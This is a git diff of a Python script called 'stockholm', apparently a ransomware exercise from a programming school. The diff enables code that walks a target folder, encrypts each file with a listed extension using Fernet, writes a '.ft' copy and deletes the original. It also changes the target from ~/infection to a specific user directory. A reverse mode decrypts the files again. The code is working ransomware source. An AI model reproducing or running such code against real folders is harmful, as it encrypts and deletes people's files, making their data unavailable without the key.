@@ -13,7 +13,8 @@ from pathlib import Path
 from cryptography.fernet import Fernet
 
 VERSION = 1.0
-TARGET_FOLDER = Path.home().as_posix() + "/infection" 
+TARGET_FOLDER = "/home/tfrily/goinfre/LivreIT"
+# TARGET_FOLDER = Path.home().as_posix() + "/infection" 
 
 def get_extentions(path_to_file: str) -> dict:
     d = {}
@@ -21,9 +22,6 @@ def get_extentions(path_to_file: str) -> dict:
         for line in f:
             d[line.rstrip().split('.')[1]] = line.rstrip()
     return d
-
-# def get_files(path_to_folder: str) -> list[str]:
-#     return os.listdir(path_to_folder)
 
 def create_key() -> bytes:
         key = Fernet.generate_key()
@@ -57,33 +55,28 @@ def stockholm(key: bytes, s: bool):
     extentions = get_extentions("extensions.txt")
     # files = get_files(infection_dir)
     for root, subdirs, files in os.walk(TARGET_FOLDER):
-        try:
-            print(f"New step")
-            print(f"ROOT {root}")
-            print (f"SUBDIRS {subdirs}")
-            
             for file in files:
-                if extentions[file.split('.')[-1]] and file.split('.')[-1] != "ft":
-                    os.path.join(root,file)
-                    # write_content_file(os.path.join(root, file + ".ft"), encrypt_file(os.path.join(root, file), key))
-                    # remove_file(os.path.join(root, file))
-                if s is True:
-                    print(f"Encrypted file {file}")
-        except Exception:
-            continue
+                try:
+                    if extentions[file.split('.')[-1]] and file.split('.')[-1] != "ft":
+                        print(f"File TO Encrypt {file}")
+                        # print(f"FILE {os.path.join(root,file)}")
+                        write_content_file(os.path.join(root, file + ".ft"), encrypt_file(os.path.join(root, file), key))
+                        remove_file(os.path.join(root, file))
+                    if s is True:
+                        print(f"Encrypted file {file}")
+                except Exception:
+                    continue
 
 def reverse_stockholm(key: bytes):
     for root, subdirs, files in os.walk(TARGET_FOLDER):
-        try:
             for file in files:
-                if file.split('.')[-1] == "ft":
-                    file_path, ext = os.path.splitext(os.path.join(root, file))
-                    write_content_file(file_path, decrypt_file(os.path.join(root, file), key))
-                    remove_file(os.path.join(root, file))
-        except Exception:
-            continue
-
-
+                try:
+                    if file.split('.')[-1] == "ft":
+                        file_path, ext = os.path.splitext(os.path.join(root, file))
+                        write_content_file(file_path, decrypt_file(os.path.join(root, file), key))
+                        remove_file(os.path.join(root, file))
+                except Exception:
+                    continue
 
 def main():
     parser = argparse.ArgumentParser()
@@ -100,9 +93,6 @@ def main():
             exit(1)
         if args.key is not None:
             key = args.key
-        # else:
-        #     key = create_key()
-            # print(f"The key {key}")
         if args.reverse is None:
             if key is None:
                 key = create_key()
